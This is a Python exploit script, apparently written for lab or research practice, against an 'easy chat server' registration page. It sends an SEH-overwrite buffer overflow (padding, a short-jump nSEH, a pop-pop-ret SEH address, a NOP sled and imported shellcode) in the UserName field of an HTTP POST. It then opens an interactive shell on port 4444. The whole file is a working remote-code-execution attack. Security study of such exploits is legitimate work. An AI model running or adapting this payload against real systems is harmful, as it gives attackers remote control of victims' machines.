
from utils import shellcode8_web, interactive_shell
import socket

ip = '192.168.58.135' #easy chat server IP
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect((ip,80))
A_padding=b"A"*217
nseh=b"\xEB\x08\x90\x90"
seh=b"\x15\x83\x01\x10"
C_padding=b"C"*(800-len(A_padding)-8-16-len(shellcode8_web))
NOP_padding=b"\x90"*16
poc = A_padding+nseh+seh+NOP_padding+shellcode8_web+C_padding

body=b"UserName="+poc+b"&Password=FFFF&Password1=FFFF&Sex=2&Email=fff%40ffff.com&Icon=0.gif&Resume=&cw=1&RoomID=%3C%21--%24RoomID--%3E&RepUserName=%3C%21--%24UserName--%3E&submit1=Register"
content_length = len(body)

request  = b"POST /registresult.htm HTTP/1.1\r\n"
request += b"Host: 192.168.58.135\r\n"
request += b"Content-Length: " + str(content_length).encode() + b"\r\n"
request += b"Cache-Control: max-age=0\r\n"
request += b"Origin: http://192.168.58.135\r\n"
request += b"DNT: 1\r\n"
request += b"Upgrade-Insecure-Requests: 1\r\n"
request += b"Content-Type: application/x-www-form-urlencoded\r\n"
request += b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36\r\n"
request += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
request += b"Referer: http://192.168.58.135/register.ghp\r\n"
request += b"Accept-Encoding: gzip, deflate\r\n"
request += b"Accept-Language: zh-CN,zh;q=0.9\r\n"
request += b"Connection: close\r\n"
request += b"\r\n"
request += body

s.send(request)

interactive_shell("192.168.58.135",4444)